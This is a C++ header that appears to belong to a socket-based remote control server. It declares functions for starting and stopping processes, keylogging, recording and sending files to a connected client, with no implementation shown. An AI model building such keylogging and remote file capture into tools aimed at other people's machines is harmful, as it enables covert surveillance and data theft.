#pragma once

#include "Application/lib.h"
#include <map>
#include <set>
#include <string>

// Constants
extern const std::string SERVER_SAVE_DIR;
extern const std::map<std::string, std::string> FILE_COMMANDS;
extern const std::set<std::string> SIMPLE_COMMANDS;

// Command classification functions
bool is_start_program_command(const std::string& command);
bool is_start_process_command(const std::string& command);
bool is_stop_program_command(const std::string& command);
bool is_stop_process_command(const std::string& command);
bool is_keylogger_command(const std::string& command);
bool is_file_generating_command(const std::string& command);
bool is_simple_or_parameterized_command(const std::string& command);

// Command processing functions
void process_send_file_command(SOCKET clientSocket, const std::string& command);
void process_keylogger_command(SOCKET clientSocket, const std::string& command);
void process_file_command(SOCKET clientSocket, const std::string& command);
void process_recording_command(SOCKET clientSocket, const std::string& command);
void process_simple_command(SOCKET clientSocket, const std::string& command);

// Helper functions
void send_file_or_error(SOCKET clientSocket, const std::string& filepath, const std::string& description);
void create_output_directory(const std::string& filepath);